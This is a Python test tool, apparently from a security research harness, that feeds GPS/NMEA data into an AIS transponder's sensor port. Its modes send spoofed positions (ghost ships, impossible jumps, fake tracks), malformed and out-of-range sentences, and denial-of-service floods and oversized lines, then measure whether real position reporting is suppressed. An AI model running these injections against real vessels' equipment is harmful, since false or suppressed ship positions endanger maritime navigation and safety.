#!/usr/bin/env python3
"""GPS injection into a transponder sensor port, and malformed-NMEA injection.

Modes:
  static   - hold one position (ghost ship)
  jump     - alternate between two positions (impossible jump)
  move     - dead-reckon along a course
  malformed- send the malformation library one item at a time

Every action logs a marker to an events.jsonl (via the `events` callback) so the
analyzer knows exactly when each thing happened. Designed to be driven by the
runner, but also runnable standalone for quick checks.
"""
import argparse, json, math, time
import serial
import nmea


def _emit(ser, dry, s):
    """s may be str (valid sentence) or bytes (malformed)."""
    data = s if isinstance(s, bytes) else (s + "\r\n").encode()
    if not isinstance(s, bytes):
        pass
    else:
        data = s + b"\r\n"
    if dry:
        print("  TX", data[:80])
    else:
        ser.write(data)


def _advance(lat, lon, sog_kts, cog_deg, dt):
    dist = sog_kts * 0.5144 * dt
    c = math.radians(cog_deg)
    lat2 = lat + (dist * math.cos(c)) / 111320.0
    lon2 = lon + (dist * math.sin(c)) / (111320.0 * math.cos(math.radians(lat)))
    return lat2, lon2


def run_static(ser, dry, lat, lon, duration, rate=1.0, events=None):
    end = time.time() + duration
    while time.time() < end:
        for s in nmea.full_batch(lat, lon):
            _emit(ser, dry, s)
        time.sleep(rate)


def run_jump(ser, dry, a, b, duration, hold=10.0, rate=1.0, events=None):
    """Alternate position a and b every `hold` seconds -> impossible jump."""
    end = time.time() + duration
    cur = a; nxt_swap = time.time() + hold; at_a = True
    while time.time() < end:
        if time.time() >= nxt_swap:
            at_a = not at_a
            cur = a if at_a else b
            nxt_swap = time.time() + hold
            if events:
                events({"event": "jump_to", "lat": cur[0], "lon": cur[1]})
        for s in nmea.full_batch(cur[0], cur[1]):
            _emit(ser, dry, s)
        time.sleep(rate)


def run_move(ser, dry, lat, lon, sog, cog, duration, rate=1.0, events=None):
    end = time.time() + duration
    while time.time() < end:
        for s in nmea.full_batch(lat, lon, sog, cog):
            _emit(ser, dry, s)
        lat, lon = _advance(lat, lon, sog, cog, rate)
        time.sleep(rate)


def run_sweep(ser, dry, positions, hold=20.0, rate=1.0, events=None):
    """Hold each position in turn for `hold` seconds. Each is a distinct static
    ghost (no interpolation between them). Logs which position, when, so the
    analyzer/operator can line reports up to targets."""
    for (lat, lon) in positions:
        if events:
            events({"event": "sweep_to", "lat": lat, "lon": lon})
        end = time.time() + hold
        while time.time() < end:
            for s in nmea.full_batch(lat, lon):
                _emit(ser, dry, s)
            time.sleep(rate)


def run_badcoords(ser, dry, entries, hold=15.0, rate=1.0, events=None):
    """Sweep impossible / out-of-range coordinate VALUES as structurally valid
    NMEA. Tests the transponder's value validation (reject / clamp / sentinel /
    misbehave), NOT its sentence parser. Each entry is a dict with a "label" and
    either decimal {"lat","lon"} or raw field strings
    {"lat_raw","lat_h","lon_raw","lon_h"}.
    """
    for e in entries:
        if events:
            events({"event": "badcoord", "label": e["label"],
                    "spec": {k: v for k, v in e.items() if k != "label"}})
        end = time.time() + hold
        while time.time() < end:
            if "lat_raw" in e:
                batch = nmea.full_batch_raw(e["lat_raw"], e["lat_h"],
                                            e["lon_raw"], e["lon_h"])
            else:
                batch = nmea.full_batch(e["lat"], e["lon"])
            for s in batch:
                _emit(ser, dry, s)
            time.sleep(rate)


def run_malformed(ser, dry, gap=3.0, events=None, repeat=1):
    """Send each malformation, spaced by `gap` seconds, logging which/when."""
    for _ in range(repeat):
        for fn in nmea.MALFORMATIONS:
            label, payload = fn()
            if events:
                events({"event": "malformed_tx", "label": label,
                        "bytes": len(payload)})
            _emit(ser, dry, payload)
            time.sleep(gap)


# ===================== DoS / parser-stress characterization =====================
# Key design point: parser processing time is NOT measurable from the input side
# (at the line rate the OS clocks bytes out regardless of what the unit does).
# The DoS signal is on the OUTPUT: with a VALID GPS baseline established, an
# attack that starves/blocks the sensor channel makes the transmitted position
# fall to the 91/181 "no-fix" sentinel. We measure how long legitimate reporting
# is suppressed. So every routine here establishes a valid baseline first.

def _gps_for(ser, dry, lat, lon, seconds, rate=1.0, sog=12.0, cog=90.0, events=None):
    """Stream valid GPS for `seconds`. SOG>0 makes the unit report at the fast
    Class A interval (~2-6 s), giving good temporal resolution on the output."""
    end = time.time() + seconds
    while time.time() < end:
        for s in nmea.full_batch(lat, lon, sog, cog):
            _emit(ser, dry, s)
        time.sleep(rate)


def _cksum(body):
    c = 0
    for ch in body:
        c ^= ord(ch)
    return f"{c:02X}"


def _make_line(length, spoof=None):
    """An over-length line of `length` bytes (excl CRLF).

    If `spoof=(lat,lon)` is given, the line is a VALID, spoof-position-bearing RMC
    padded to `length` with a valid checksum, so that a unit which fails to enforce
    the length bound and *parses* the sentence will transmit the spoof position, making
    acceptance (vs mere denial) detectable. Padding goes in a trailing field so the
    sentence stays structurally parseable. Without `spoof`, falls back to inert padding
    (denial/timing measurement only)."""
    if spoof is not None:
        lat, lon = spoof
        from datetime import datetime, timezone
        now = datetime.now(timezone.utc)
        tm = now.strftime("%H%M%S.00"); dt = now.strftime("%d%m%y")
        latd = int(abs(lat)); latm = (abs(lat) - latd) * 60
        lond = int(abs(lon)); lonm = (abs(lon) - lond) * 60
        la = f"{latd:02d}{latm:07.4f}"; lah = "N" if lat >= 0 else "S"
        lo = f"{lond:03d}{lonm:07.4f}"; loh = "E" if lon >= 0 else "W"
        body = f"GPRMC,{tm},A,{la},{lah},{lo},{loh},0.0,90.0,{dt},,,A"
        pad_needed = length - (1 + len(body) + 1 + 2)  # $ + body + * + 2 hex chars
        if pad_needed > 0:
            body = body + "," + ("0" * (pad_needed - 1))
        return "$" + body + "*" + _cksum(body)
    base = "$GPRMC,"
    if length <= len(base):
        return base[:length]
    return base + "0" * (length - len(base))


def _write_timed(ser, dry, data, baud):
    """Write bytes (+CRLF), wait for transmit to drain, return (write_s, predicted_s)."""
    payload = (data if isinstance(data, bytes) else data.encode()) + b"\r\n"
    predicted = len(payload) * 10.0 / baud      # 10 bits/byte (start+8+stop)
    t0 = time.time()
    if not dry:
        ser.write(payload)
        ser.flush()                             # block until OS buffer drained
    return (time.time() - t0, predicted)


def run_dos_lengthsweep(ser, dry, baseline, lengths, baud,
                        settle=20, recover=30, rate=1.0, events=None, spoof=(43.5, -71.5)):
    """Baseline valid GPS at `baseline`, then for each length send ONE oversized line
    carrying a DISTINCT spoof position and let the unit recover. The analyzer can then
    distinguish three outcomes per length: the unit transmitted the spoof position
    (ACCEPTED, parsed the over-length sentence), went to no-fix (DEGRADED/denial), or
    kept reporting baseline (ingested-but-ignored). `spoof` differs from `baseline` so
    acceptance is unambiguous."""
    lat, lon = baseline
    if events: events({"event": "baseline_start", "seconds": settle,
                       "baseline": [lat, lon], "spoof": list(spoof)})
    _gps_for(ser, dry, lat, lon, settle, rate, events=events)
    for L in lengths:
        if events: events({"event": "attack_start", "kind": "length", "length": L,
                           "spoof": list(spoof)})
        w, pred = _write_timed(ser, dry, _make_line(L, spoof=spoof), baud)
        if events: events({"event": "attack_end", "kind": "length", "length": L,
                           "write_s": round(w, 3), "predicted_s": round(pred, 3)})
        if events: events({"event": "recover_start", "length": L, "seconds": recover})
        _gps_for(ser, dry, lat, lon, recover, rate, events=events)
    if events: events({"event": "baseline_end"})


def run_unterminated(ser, dry, baseline, total_bytes, baud,
                     settle=20, recover=40, rate=1.0, events=None):
    """Send a long run of bytes with NO CR/LF terminator, then resume valid GPS.
    Tests whether the parser blocks waiting for end-of-sentence (a naive parser
    can be stalled far longer than the raw transmit time would predict)."""
    lat, lon = baseline
    if events: events({"event": "baseline_start", "seconds": settle})
    _gps_for(ser, dry, lat, lon, settle, rate, events=events)
    payload = b"$GPRMC," + b"0" * total_bytes      # never terminated
    predicted = (len(payload) * 10.0) / baud
    if events: events({"event": "attack_start", "kind": "unterminated",
                       "bytes": total_bytes})
    t0 = time.time()
    if not dry:
        ser.write(payload); ser.flush()
    if events: events({"event": "attack_end", "kind": "unterminated",
                       "bytes": total_bytes, "write_s": round(time.time()-t0, 3),
                       "predicted_s": round(predicted, 3)})
    # resume: the first valid sentence's CRLF finally terminates the runaway line
    if events: events({"event": "recover_start", "seconds": recover})
    _gps_for(ser, dry, lat, lon, recover, rate, events=events)
    if events: events({"event": "baseline_end"})


def run_flood(ser, dry, baseline, duration, baud,
              settle=20, recover=30, rate=1.0, events=None):
    """Saturate the sensor channel with back-to-back oversized junk for
    `duration` s (no valid GPS during it), then recover. Models an attacker
    holding the line; measures sustained suppression + recovery time."""
    lat, lon = baseline
    if events: events({"event": "baseline_start", "seconds": settle})
    _gps_for(ser, dry, lat, lon, settle, rate, events=events)
    if events: events({"event": "attack_start", "kind": "flood", "duration": duration})
    end = time.time() + duration; n = 0
    junk = _make_line(256)
    while time.time() < end:
        _write_timed(ser, dry, junk, baud); n += 1
        if dry:
            break
    if events: events({"event": "attack_end", "kind": "flood", "sentences": n})
    if events: events({"event": "recover_start", "seconds": recover})
    _gps_for(ser, dry, lat, lon, recover, rate, events=events)
    if events: events({"event": "baseline_end"})


def run_alert_probe(ser, dry, baseline, baud,
                    settle=15, hold=12, recover=8, rate=1.0, events=None):
    """For each malformation, establish baseline then repeat that input for
    `hold` s, logging probe windows so the analyzer can count alert sentences
    ($AIALC/ALR/PFEC) per input and see which trigger alerts / sustain them."""
    lat, lon = baseline
    for fn in nmea.MALFORMATIONS:
        label, _ = fn()
        if events: events({"event": "probe_baseline", "probe": label, "seconds": settle})
        _gps_for(ser, dry, lat, lon, settle, rate, events=events)
        if events: events({"event": "probe_start", "probe": label})
        end = time.time() + hold
        while time.time() < end:
            _, payload = fn()
            _emit(ser, dry, payload)
            time.sleep(1.0)
            if dry:
                break
        if events: events({"event": "probe_end", "probe": label})
        _gps_for(ser, dry, lat, lon, recover, rate, events=events)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--port", default="/dev/ttyUSB0")
    p.add_argument("--baud", type=int, default=4800)
    p.add_argument("--dry-run", action="store_true")
    sub = p.add_subparsers(dest="mode", required=True)
    s = sub.add_parser("static"); s.add_argument("lat", type=float); s.add_argument("lon", type=float); s.add_argument("--dur", type=float, default=30)
    j = sub.add_parser("jump"); j.add_argument("lat1", type=float); j.add_argument("lon1", type=float); j.add_argument("lat2", type=float); j.add_argument("lon2", type=float); j.add_argument("--dur", type=float, default=60); j.add_argument("--hold", type=float, default=10)
    m = sub.add_parser("move"); m.add_argument("lat", type=float); m.add_argument("lon", type=float); m.add_argument("--sog", type=float, default=8); m.add_argument("--cog", type=float, default=90); m.add_argument("--dur", type=float, default=60)
    mf = sub.add_parser("malformed"); mf.add_argument("--gap", type=float, default=3)
    sw = sub.add_parser("sweep"); sw.add_argument("--hold", type=float, default=20)
    sw.add_argument("positions", nargs="+", help="lat,lon pairs e.g. 42.35,-70.9 0,0")
    a = p.parse_args()

    ser = None if a.dry_run else serial.Serial(a.port, a.baud, timeout=1)
    ev = lambda d: print("  EVENT", d)
    if a.mode == "static":
        run_static(ser, a.dry_run, a.lat, a.lon, a.dur, events=ev)
    elif a.mode == "jump":
        run_jump(ser, a.dry_run, (a.lat1, a.lon1), (a.lat2, a.lon2), a.dur, a.hold, events=ev)
    elif a.mode == "move":
        run_move(ser, a.dry_run, a.lat, a.lon, a.sog, a.cog, a.dur, events=ev)
    elif a.mode == "malformed":
        run_malformed(ser, a.dry_run, a.gap, events=ev)
    elif a.mode == "sweep":
        pts = [tuple(float(x) for x in p.split(",")) for p in a.positions]
        run_sweep(ser, a.dry_run, pts, a.hold, events=ev)
    if ser:
        ser.close()


if __name__ == "__main__":
    main()
